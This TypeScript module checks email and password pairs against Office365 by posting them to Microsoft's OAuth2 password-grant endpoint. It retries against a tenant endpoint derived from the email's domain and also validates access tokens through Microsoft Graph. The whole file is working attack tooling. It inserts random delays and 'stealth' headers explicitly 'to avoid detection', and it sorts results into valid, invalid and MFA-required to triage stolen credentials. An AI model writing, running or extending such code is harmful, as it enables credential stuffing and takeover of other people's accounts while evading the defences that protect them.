import { randomDelay, getStealthHeaders } from './stealthUtils'

// Office365/Microsoft authentication verification
export async function verifyOffice365Credentials(
  email: string,
  password: string
): Promise<{ valid: boolean; error?: string }> {
  try {
    // Add random delay to avoid detection
    await randomDelay(500, 1500)

    // Try Office365 authentication via OAuth2 password grant
    // Use /organizations endpoint instead of /common (as per Microsoft requirements)
    const clientId = '00000003-0000-0000-c000-000000000000' // Microsoft Graph client ID
    
    const headers = getStealthHeaders()
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    // Try organizations endpoint first (required for password grant)
    let response = await fetch(
      `https://login.microsoftonline.com/organizations/oauth2/v2.0/token`,
      {
        method: 'POST',
        headers,
        body: new URLSearchParams({
          grant_type: 'password',
          username: email,
          password: password,
          client_id: clientId,
          scope: 'openid profile email',
        }),
      }
    )
    
    // If organizations fails, try tenant-specific (extract domain)
    if (!response.ok) {
      const domain = email.split('@')[1]
      if (domain) {
        // Try tenant-specific endpoint
        response = await fetch(
          `https://login.microsoftonline.com/${domain}/oauth2/v2.0/token`,
          {
            method: 'POST',
            headers,
            body: new URLSearchParams({
              grant_type: 'password',
              username: email,
              password: password,
              client_id: clientId,
              scope: 'openid profile email',
            }),
          }
        )
      }
    }

    // Add delay before checking response
    await randomDelay(200, 500)

    const data = await response.json()

    if (response.ok && data.access_token) {
      return { valid: true }
    }

    // Check for specific error codes
    if (data.error === 'invalid_grant' || data.error === 'invalid_client') {
      return { valid: false, error: 'Invalid credentials' }
    }

    if (data.error === 'interaction_required') {
      // MFA required - credentials might be valid but need MFA
      return { valid: false, error: 'MFA required' }
    }
    
    // Extract error code if present (e.g., AADSTS9001023)
    let errorMessage = data.error_description || 'Authentication failed'
    if (errorMessage.includes('AADSTS')) {
      // Extract just the error code for cleaner message
      const errorCodeMatch = errorMessage.match(/AADSTS\d+/)
      if (errorCodeMatch) {
        errorMessage = `Office365 Error: ${errorCodeMatch[0]}`
      }
    }

    return { valid: false, error: errorMessage }
  } catch (error: any) {
    return { valid: false, error: error.message || 'Verification failed' }
  }
}

// Alternative: Verify via Microsoft Graph API (if we have access token)
export async function verifyOffice365ViaGraph(
  accessToken: string
): Promise<boolean> {
  try {
    await randomDelay(300, 700)

    const response = await fetch('https://graph.microsoft.com/v1.0/me', {
      method: 'GET',
      headers: {
        ...getStealthHeaders(),
        Authorization: `Bearer ${accessToken}`,
      },
    })

    return response.ok
  } catch (error) {
    return false
  }
}

